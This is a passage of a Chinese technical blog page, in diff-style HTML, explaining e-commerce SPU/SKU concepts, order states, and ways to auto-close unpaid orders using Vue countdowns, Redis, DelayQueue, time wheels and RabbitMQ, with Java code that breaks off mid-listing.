+      <a data-url="https://s-qwer.github.io/2021/06/30/4.27.%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="ckw61sdv90021oswdb6d721xo" data-title="序列化与反序列化" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-电商项目" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/06/28/%E7%94%B5%E5%95%86%E9%A1%B9%E7%9B%AE/" class="article-date">
+  <time class="dt-published" datetime="2021-06-28T08:50:13.000Z" itemprop="datePublished">2021-06-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/06/28/%E7%94%B5%E5%95%86%E9%A1%B9%E7%9B%AE/">电商项目</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>商品、单品、SPU、SKU</p>
+<h3 id="SPU"><a href="#SPU" class="headerlink" title="SPU"></a>SPU</h3><p>SPU是(Standard Product Unit)标准化产品单元，区分品种,该集合描述了一个产品的特性。属性值、特性相同的商品就可以称为一个SPU。</p>
+<p>例如，iphone4就是一个SPU，N97也是一个SPU，这个与商家无关，与颜色、款式、套餐也无关。</p>
+<h3 id="SKU"><a href="#SKU" class="headerlink" title="SKU"></a>SKU</h3><p>SKU是（stock keeping unit）库存量单位，区分单品，库存进出计量的单位， 可以是以件、盒、托盘等为单位。在服装、鞋类商品中使用最多最普遍。 </p>
+<p>例如纺织品中一个SKU通常表示：规格、颜色、款式。 SKU是物理上不可分割的最小存货单元。在使用时要根据不同业态，不同管理模式来处理。比如一香烟是50条，一条里有十盒，一盒中有20支，这些单位就要根据不同的需要来设定SKU</p>
+<p>商品特指与商家有关的商品，可对应多个SKU</p>
+<p>sku通常在电商项目里代表库存。可以放在product表里，也可以拆出来放在库存表里，看你们自己的表结构设计了。</p>
+<h3 id="订单"><a href="#订单" class="headerlink" title="订单"></a>订单</h3><table>
+<thead>
+<tr>
+<th>订单状态</th>
+<th>状态说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>待付款</strong></td>
+<td>成功创建订单，但还未支付</td>
+</tr>
+<tr>
+<td>已付款</td>
+<td>订单成功支付</td>
+</tr>
+<tr>
+<td><strong>待发货</strong></td>
+<td>订单货物已完成配货，正在等待快递发出</td>
+</tr>
+<tr>
+<td>已发货（<strong>待收货</strong>）</td>
+<td>订单货物已发出，可以根据物流号在本站或相关物流公司网站查询订单配送状态</td>
+</tr>
+<tr>
+<td>已收货</td>
+<td>订单商品已经到了下单时选择的收货地址，手动确认收货或者系统自动收货</td>
+</tr>
+<tr>
+<td>已完成*</td>
+<td>已核对并签收订单商品30天（可配置）</td>
+</tr>
+<tr>
+<td><strong>已取消</strong></td>
+<td>表示由您自己或委托客服取消的订单</td>
+</tr>
+<tr>
+<td>已确认（货到付款）</td>
+<td>货到付款的订单需要本商城人员确认</td>
+</tr>
+</tbody></table>
+<h4 id="前端（VUE）"><a href="#前端（VUE）" class="headerlink" title="前端（VUE）"></a>前端（VUE）</h4><p>实现1：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;recomTime&quot; v-show&#x3D;&quot;orderinfo.orderState&#x3D;&#x3D;&#39;1&#39;&quot;&gt;剩余支付时间 &#123;&#123;rocallTime&#125;&#125;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;当 this.orderinfo.orderState&#x3D;&#x3D;&#39;1&#39; 调 this.ComputetTime(data) 即可</span><br><span class="line">&#x2F;&#x2F;支付倒计时</span><br><span class="line">    ComputetTime(data) &#123;</span><br><span class="line">      let st &#x3D; data.currentTime.replace(&#x2F;\-&#x2F;g, &quot;&#x2F;&quot;),&#x2F;&#x2F;当前服务器时间</span><br><span class="line">        ct &#x3D; data.formatCreateTime.replace(&#x2F;\-&#x2F;g, &quot;&#x2F;&quot;);&#x2F;&#x2F;创建订单时间</span><br><span class="line">      let ts &#x3D; new Date(st).getTime(),</span><br><span class="line">        tc &#x3D; new Date(ct).getTime();</span><br><span class="line">      let cm &#x3D; 15 * 60 * 1000 - (ts - tc);</span><br><span class="line">      this.runBack(cm);</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    runBack(cm) &#123;</span><br><span class="line">      if (cm &gt; 0) &#123;</span><br><span class="line">        cm &gt; 60000 ? (</span><br><span class="line">                this.rocallTime &#x3D;</span><br><span class="line">                    (new Date(cm).getMinutes() &lt; 10 ? &quot;0&quot; + new Date(cm).getMinutes() : new Date(cm).getMinutes())</span><br><span class="line">                    + &quot;:&quot; +</span><br><span class="line">                    (new Date(cm).getSeconds() &lt; 10 ? &quot;0&quot; + new Date(cm).getSeconds() : new Date(cm).getSeconds())</span><br><span class="line">            )</span><br><span class="line">            :</span><br><span class="line">            (this.rocallTime &#x3D; &quot;00:&quot; + (new Date(cm).getSeconds() &lt; 10 ? &quot;0&quot; + new Date(cm).getSeconds() : new Date(cm).getSeconds()));</span><br><span class="line">        let _msThis &#x3D; this;</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">          cm -&#x3D; 1000;</span><br><span class="line">          _msThis.runBack(cm);</span><br><span class="line">        &#125;, 1000);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        this.changeOrderState();&#x2F;&#x2F;调用改变订单状态接口</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>
+
+<p>实现2：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">countDown() &#123;</span><br><span class="line">  this.time &#x3D; this.time.replace(&#x2F;-&#x2F;g, &quot;&#x2F;&quot;);</span><br><span class="line">  let currentTime &#x3D; new Date().getTime();</span><br><span class="line">  let createTime &#x3D; new Date(this.time).getTime();</span><br><span class="line">  let difference &#x3D; (currentTime - createTime) &#x2F; 1000;</span><br><span class="line">  if (difference &gt; 600) &#123;</span><br><span class="line">    this.showCountDown &#x3D; false;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  let _minute &#x3D; 9 - Math.floor((currentTime - createTime) &#x2F; 1000 &#x2F; 60);</span><br><span class="line">  let _second &#x3D; 60 - Math.floor((currentTime - createTime) &#x2F; 1000 % 60);</span><br><span class="line">  let timer &#x3D; window.setInterval(() &#x3D;&gt; &#123;</span><br><span class="line">    _second--;</span><br><span class="line">    if (_second &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">      if (_minute &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">        const res &#x3D; this.$request.post(&#39;&#x2F;queryorder&#39;, &#123;orderSn: this.orderSn&#125;);</span><br><span class="line">        if (res.data.code !&#x3D;&#x3D; 200) &#123;</span><br><span class="line">          this.showCountDown &#x3D; false;</span><br><span class="line">          window.clearInterval(timer);</span><br><span class="line">          window.location.reload();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      _second &#x3D; 59;</span><br><span class="line">      _minute &#x3D; _minute - 1;</span><br><span class="line">    &#125;</span><br><span class="line">    this.second &#x3D; _second &lt; 10 ? &#39;0&#39; + _second : _second;</span><br><span class="line">    this.minute &#x3D; &#39;0&#39; + _minute;</span><br><span class="line">  &#125;, 1000);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="订单超时未支付自动关闭实现（后端java）"><a href="#订单超时未支付自动关闭实现（后端java）" class="headerlink" title="订单超时未支付自动关闭实现（后端java）"></a><strong>订单超时未支付自动关闭实现</strong>（后端java）</h4><p>思路：</p>
+<p>1.采用定时轮询（数据库消耗大）</p>
+<p>2.前端访问时再更新（用户体验差）</p>
+<p>3.采用延时任务</p>
+<p>​    1）java自带的DelayQueue</p>
+<p>​    2）redis实现延时队列: zset的score实现，redis的过期属性实现</p>
+<p>​    3）时间轮（netty，kafka等都有）</p>
+<p>​    4）消息中间件（Rabbit MQ,Rocket MQ ）</p>
+<p>4.可以在数据里加一个过期字段（或者根据创建时间字段来判断是否过期），等查询订单时判断是否过期来是否进行更新操作，返回结果。</p>
+<p><strong>定时任务</strong></p>
+<p>实现思路比较简单。启动一个计划任务，每隔一定时间处理一次，这种处理方式只是适用比较小而简单的项目。</p>
+<p>假设订单表的结构为：</p>
+<p>t_order(oid, finish_time, stars, status, …)</p>
+<p>然后，定时任务每隔一个 5 分钟（时间自己设定）等会这么做一次：</p>
+<p>select oid from t_order where finish_time &gt; 30分钟 and status=0;</p>
+<p>update t_order set status=1 where oid in(超时订单id);</p>
+<p>如果数据量很大，需要分页查询，分页 update，这将会是一个 for 循环。</p>
+<p>但是，这种设计方案有一种明显的不足。</p>
+<ol>
+<li>时效性差，会有一定的延迟，这个延迟时间最大就是每隔一定时间的大小，如果你设置每分钟定时轮询一次，那么理论上订单取消时间的最大误差就有一分钟，当然也可能更大，比如一分钟之内有大量数据，但是一分钟没处理完，那么下一分钟的就会顺延。</li>
+<li>效率低。</li>
+<li>对数据库的压力比较大。</li>
+</ol>
+<p>但是，也有优势。</p>
+<ol>
+<li>定时任务，实现起来简单。</li>
+<li>也能很好的做分布式集群。</li>
+</ol>
+<p>可以用quartz来实现，也可以用java的schedule实现</p>
+<p>应该采用延时任务</p>
+<p>​    定时任务有明确的触发时间，延时任务没有</p>
+<p>​    定时任务有执行周期，而延时任务在某事件触发后一段时间内执行，没有执行周期</p>
+<p>​    定时任务一般执行的是批处理操作是多个任务，而延时任务一般是单个任务</p>
+<p><strong>被动取消</strong></p>
+<p>这种实现方案和懒加载的思想一致，就是被动的取消订单。只有当用户或商户查询订单信息时，再判断该订单是否超时，如果超时再进行超时逻辑的处理。</p>
+<p>但是这种方式依赖于用户的查询操作触发，这也就是说如果用户不进行查询订单的操作，该订单就永远不会被取消。不会取消的订单，也就可能意味着库存可能被占用。</p>
+<p>所以，在实际实现上，可能是被动取消 + 定时任务的这种组合实现方式。这种情况下定时任务的时间可以设置的稍微“长“一点。</p>
+<p>缺点：</p>
+<ol>
+<li>会产生额外影响，比如统计，订单数，库存等产生影响。</li>
+<li>影响用户体验，用户打开订单列表可能要处理大量数据，影响显示的实时性。</li>
+</ol>
+<p>优点，同样是实现起来简单。</p>
+<p><strong>延时消息</strong>（可见redis部分的延时队列实现）</p>
+<p>这种方式是目前比较普遍的实现方式。</p>
+<p>延时消息的这种实现方式，包含两个重要的数据结构：</p>
+<ol>
+<li>环形队列，例如可以创建一个包含 2400 个 slot 的环形队列（本质是个数组）。</li>
+<li>任务集合，环上每一个 slot 是一个 Set。</li>
+</ol>
+<p>本质上，就是一个时间轮算法的一个实现。</p>
+<p><img src="/%E7%94%B5%E5%95%86%E9%A1%B9%E7%9B%AE/558c8cbd9a02e2a923ee5081dc388e44.png" alt="订单超时未支付自动关闭的几种实现方案_Java"></p>
+<p>如果公司允许，可以在此基础上，扩展成一个分布式的，支持集群的延时队列。但是缺点是，难度较高，小公司根本没有这个机会来做。</p>
+<p><strong>Redis 缓存</strong></p>
+<p>利用 redis 的 zset。zset是一个有序集合，每一个元素(member)都关联了一个 score，通过 score 排序来取集合中的值。</p>
+<p>我们将订单超时时间戳与订单号分别设置为 score 和 member。系统扫描第一个元素判断是否超时，具体如下图所示。</p>
+<p><img src="/%E7%94%B5%E5%95%86%E9%A1%B9%E7%9B%AE/107be688a9140c5b4ecf06e09370e2f4.png" alt="img"></p>
+<p>但是，这种实现方式，在高并发条件下，多消费者可能会取到同一个订单号。多个线程消费同一个资源的情况。</p>
+<p>解决方案：1.加一个分布式锁来处理。但是，性能下降严重。2.采用对ZREM的返回值进行判断，只有大于0的时候，才消费数据</p>
+<p>使用redis的Keyspace Notifications，中文翻译就是键空间机制，就是利用该机制可以在key失效之后，提供一个回调，实际上是redis会给客户端发送一个消息。是需要redis版本2.8以上。</p>
+<p>注：Redis的发布/订阅目前是即发即弃(fire and forget)模式的，因此无法实现事件的可靠通知。也就是说，如果发布/订阅的客户端断链之后又重连，则在客户端断链期间的所有事件都丢失了。因此，方案二不是太推荐。当然，如果你对可靠性要求不高，可以使用。</p>
+<p>优点:(1)由于使用Redis作为消息通道，消息都存储在Redis中。如果发送程序或者任务处理程序挂了，重启之后，还有重新处理数据的可能性。(2)做集群扩展相当方便 (3)时间准确度高</p>
+<p>缺点:(1)需要额外进行redis维护</p>
+<p><strong>JDK的延迟队列</strong></p>
+<p>利用JDK自带的DelayQueue来实现，这是一个无界阻塞队列，该队列只有在延迟期满的时候才能从中获取元素，放入DelayQueue中的对象，是必须实现Delayed接口的。</p>
+<p><img src="/%E7%94%B5%E5%95%86%E9%A1%B9%E7%9B%AE/558c8cbd9a02e2a923ee5081dc388e44.png" alt="订单超时未支付自动关闭的几种实现方案_Java"></p>
+<p>Poll():获取并移除队列的超时元素，没有则返回空</p>
+<p>take():获取并移除队列的超时元素，如果没有则wait当前线程，直到有元素满足超时条件，返回结果。</p>
+<p>优点:效率高,任务触发时间延迟低。</p>
+<p>缺点:</p>
+<p>(1)服务器重启后，数据全部消失，怕宕机 </p>
+<p>(2)集群扩展相当麻烦 </p>
+<p>(3)因为内存条件限制的原因，比如下单未付款的订单数太多，那么很容易就出现OOM（out of memory）内存溢出异常 </p>
+<p>(4)代码复杂度较高</p>
+<p><strong>时间轮算法</strong></p>
+<p><img src="/%E7%94%B5%E5%95%86%E9%A1%B9%E7%9B%AE/640" alt="图片"></p>
+<p>时间轮算法可以类比于时钟，如上图箭头（指针）按某一个方向按固定频率轮动，每一次跳动称为一个 tick。这样可以看出定时轮由个3个重要的属性参数，ticksPerWheel（一轮的tick数），tickDuration（一个tick的持续时间）以及 timeUnit（时间单位），例如当ticksPerWheel=60，tickDuration=1，timeUnit=秒，这就和现实中的始终的秒针走动完全类似了。</p>
+<p>如果当前指针指在1上面，我有一个任务需要4秒以后执行，那么这个执行的线程回调或者消息将会被放在5上。那如果需要在20秒之后执行怎么办，由于这个环形结构槽数只到8，如果要20秒，指针需要多转2圈。位置是在2圈之后的5上面（20 % 8 + 1）</p>
+<p>可以用Netty的HashedWheelTimer来实现</p>
+<p>优点:效率高,任务触发时间延迟时间比delayQueue低，代码复杂度比delayQueue低。</p>
+<p>缺点:</p>
+<p>(1)服务器重启后，数据全部消失，怕宕机</p>
+<p>(2)集群扩展相当麻烦</p>
+<p>(3)因为内存条件限制的原因，比如下单未付款的订单数太多，那么很容易就出现OOM异常</p>
+<p><strong>消息队列</strong></p>
+<p>可以采用rabbitMQ的延时队列。</p>
+<p>RabbitMQ具有以下两个特性，可以实现延迟队列：</p>
+<p>1.RabbitMQ可以针对Queue和Message设置 x-message-tt，来控制消息的生存时间，如果超时，则消息变为dead letter</p>
+<p>2.lRabbitMQ的Queue可以配置x-dead-letter-exchange 和x-dead-letter-routing-key（可选）两个参数，用来控制队列内出现了deadletter，则按照这两个参数重新路由。</p>
+<p>结合以上两个特性，就可以模拟出延迟消息的功能</p>
+<p>优点: 高效,可以利用rabbitmq的分布式特性轻易的进行横向扩展,消息支持持久化增加了可靠性。</p>
+<p>缺点：本身的易用度要依赖于rabbitMq的运维.因为要引用rabbitMq,所以复杂度和成本变高</p>
+<h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><p>最后选择采用redis+delayqueue实现</p>
+<p>springboot项目中引入redis可以参考这篇文章：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/164608337">https://zhuanlan.zhihu.com/p/164608337</a></p>
+<p>具体流程：</p>
+<p>（1）用户下单完成以后，把订单ID插入到DelayQueue中，同时插入到Redis中。</p>
+<p>（2）30分钟之内，用户付款完成，则从DelayQueue中删除，从Redis中删除。</p>
+<p>（3）超过30分钟，DelayQueue中的订单ID出队，查询数据库，改状态为取消，删除redis。</p>
+<p>（4）如果30分钟之类，服务器重启，则服务器重新启动以后，从redis中读取待订单，重新插入到DelayQueue。</p>
+<p>DelayQueue是一个无界的BlockingQueue，用于放置实现了Delayed接口的对象，其中的对象只能在其到期时才能从队列中取走。这种队列是有序的，即队头对象的延迟到期时间最长。注意：不能将null元素放置到这种队列中。</p>
+<p>Delayed，用来标记那些应该在给定延迟时间之后执行的对象。此接口的实现必须定义一个 compareTo 方法，该方法提供与此接口的 getDelay 方法一致的排序。</p>
+<p>我们首先实现一个BaseDelayed，所有的DelayQueue中的元素必须要实现Delayed接口：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseDelayed</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">Delayed</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">long</span> startTime;  </span><br><span class="line">  <span class="keyword">private</span> T value;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">BaseDelayed</span><span class="params">()</span></span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">BaseDelayed</span><span class="params">(<span class="keyword">int</span> timeout, T value)</span></span>&#123;</span><br><span class="line">    <span class="comment">//设置超时出队的时间点</span></span><br><span class="line">    <span class="keyword">this</span>.startTime = System.currentTimeMillis() + timeout*<span class="number">1000L</span>;  </span><br><span class="line">    <span class="keyword">this</span>.value = value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**离出队还有多长时间**/</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getDelay</span><span class="params">(TimeUnit unit)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> unit.convert(<span class="keyword">this</span>.getStartTime() - System.currentTimeMillis(), TimeUnit.MILLISECONDS);  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**设置队列中元素出队的先后顺序**/</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Delayed other)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (other == <span class="keyword">this</span>)&#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span>(other <span class="keyword">instanceof</span> BaseDelayed)&#123;  </span><br><span class="line">          BaseDelayed&lt;?&gt; otherRequest = (BaseDelayed&lt;?&gt;)other;  </span><br><span class="line">          <span class="keyword">return</span> (<span class="keyword">int</span>)(<span class="keyword">this</span>.getStartTime() - otherRequest.getStartTime());  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后定义一个超时出队的监听：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OnDelayedListener</span>&lt;<span class="title">T</span> <span class="keyword">extends</span> <span class="title">BaseDelayed</span>&gt; </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDelayedArrived</span><span class="params">(T delayed)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后定义一个DelayedService：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在DelayedService加载以后，会回调InitializingBean接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DelayedService</span> <span class="keyword">implements</span>  <span class="title">InitializingBean</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Logger log = LoggerFactory.getLogger(DelayedService.class);</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> DelayQueue&lt;BaseDelayed&lt;?&gt;&gt; delayQueue = <span class="keyword">new</span> DelayQueue&lt;BaseDelayed&lt;?&gt;&gt;();</span><br><span class="line">  <span class="keyword">private</span>  <span class="keyword">static</span> ConcurrentHashMap&lt;Class&lt;? extends BaseDelayed&gt;, OnDelayedListener&gt; listeners = <span class="keyword">new</span> ConcurrentHashMap&lt;Class&lt;? extends BaseDelayed&gt;, OnDelayedListener&gt;();</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> AtomicBoolean start = <span class="keyword">new</span> AtomicBoolean(<span class="keyword">false</span>);</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    start();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> &lt;T extends BaseDelayed&lt;?&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">registerListener</span><span class="params">(Class&lt;T&gt; clazz, OnDelayedListener&lt;T&gt; listener)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(clazz == <span class="keyword">null</span> || listener == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    listeners.put(clazz, listener);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//这里启动从DelayQueue中读数据的线程</span></span><br><span class="line">  <span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (start.get()) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    start.set(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 启动读DelayQueue的线程</span></span><br><span class="line">    <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">      <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;DelayedService start&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="comment">//从DelayQueue中出队</span></span><br><span class="line">            BaseDelayed&lt;?&gt; baseDelayed = delayQueue.take();</span><br><span class="line">            <span class="comment">//所以，需要注册一下监听，该什么时候注册呢？</span></span><br><span class="line">            OnDelayedListener  onDelayedListener = listeners.get(baseDelayed.getClass());</span><br><span class="line">            <span class="keyword">if</span> (onDelayedListener != <span class="keyword">null</span>) &#123;</span><br><span class="line">              ThreadPoolUtil.execute(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                  onDelayedListener.onDelayedArrived(baseDelayed);</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;<span class="comment">//TODO</span></span><br><span class="line">              log.warn(<span class="string">&quot;没有找到监听，丢弃：&#123;&#125;&quot;</span>, baseDelayed.toString());</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,<span class="string">&quot;DelayedService&quot;</span>).start();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(BaseDelayed&lt;?&gt; baseDelayed)</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span>  &lt;T extends BaseDelayed, K&gt;<span class="function">T <span class="title">getDelayed</span><span class="params">(Class&lt;T&gt; clazz, K key)</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> &lt;T, D extends BaseDelayed&lt;?&gt;&gt; <span class="function">D <span class="title">remove</span><span class="params">(Class&lt;T&gt; clazz , T value)</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>DelayedService在系统启动完成以后，会回调InitializingBean接口的afterPropertiesSet（），这里我们启动从DelayQueue中读数据的线程，如果读到数据，需要把数据返回出去，所以就需要注册一些等待数据的监听，该什么时候注册呢？</p>
+<p>我们本例中是需要一个OrderService的，可以在OrderService加载完成以后来注册监听：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span 